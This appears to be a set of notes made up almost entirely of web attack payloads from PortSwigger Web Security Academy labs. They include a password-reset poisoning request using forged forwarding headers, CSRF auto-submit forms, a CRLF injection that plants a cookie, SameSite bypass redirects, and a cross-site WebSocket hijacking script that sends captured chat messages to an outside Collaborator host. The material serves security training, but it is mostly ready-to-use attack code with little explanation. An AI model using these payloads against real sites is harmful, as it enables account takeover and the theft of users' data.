POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator

- 
- `<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">`

    `<input type="hidden" name="$param1name" value="$param1value">`

`</form>`

<script>

    document.forms[0].submit();

</script>

- Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser: /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None  
      
    

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<html>

  <body>

    <script>history.pushState('', '', '/')</script>

    <form action="https://TARGET.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="hacker&#64;exploit&#45;0a18002e03379f0ccf16180f01180022&#46;exploit&#45;server&#46;net" />

      <input type="hidden" name="csrf" value="48hizVRa9oJ1slhOIPljozUAjqDMdplb" />

      <input type="submit" value="Submit request" />

    </form>

<img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None" onerror="document.forms[0].submit()">    

  </body>

</html>

- <script>
    

    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";

</script>

- <script>
    

    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";

</script>

- <script>
    

    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');

    ws.onopen = function() {

        ws.send("READY");

    };

    ws.onmessage = function(event) {

        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});

    };

</script>  
  
<script>

    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";

</script>

  

- <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    

    <input type="hidden" name="email" value="pwned@portswigger.net">

</form>

<p>Click anywhere on the page</p>

<script>

    window.onclick = () => {

        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');

        setTimeout(changeEmail, 5000);

    }

  

    function changeEmail() {

        document.forms[0].submit();

    }

</script>

  

- Include the following HTML to suppress the Referer header: <meta name="referrer" content="no-referrer">
    
- To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section: Referrer-Policy: unsafe-url  
    history.pushState("", "", "/?[YOUR-LAB-ID.web-security-academy.net](http://your-lab-id.web-security-academy.net)")
    

**-*--